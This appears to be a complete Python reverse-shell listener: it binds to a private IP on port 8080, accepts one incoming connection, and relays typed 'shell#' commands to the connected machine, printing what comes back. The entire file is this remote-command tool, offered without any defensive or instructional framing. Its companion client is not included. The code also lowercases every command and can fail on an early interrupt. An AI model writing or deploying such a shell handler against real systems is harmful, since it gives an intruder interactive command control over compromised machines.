#!/usr/bin/python3 

# import socket
import socket

# define host and port
host = '172.22.254.158'
port = 8080

# create socket object (server)
# bind server to host and port
# listen for connections 

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen(1)
print('listening on ', port)

# accept connection from client
client, addr = server.accept()
print('connection established with ', addr)

# shell session
while True:

    # command input
    try:
        comm = input('shell# ').strip().lower()
    except KeyboardInterrupt:
        print('try the command "close" to end the connection.')
    if comm == 'close':
        break
    elif comm == '':
        pass
    else:
        
        # encode and send command
        # receive and decode output
        client.send(comm.encode())
        output = client.recv(1024).decode()
        print(output)

# close the connetion.
server.close()
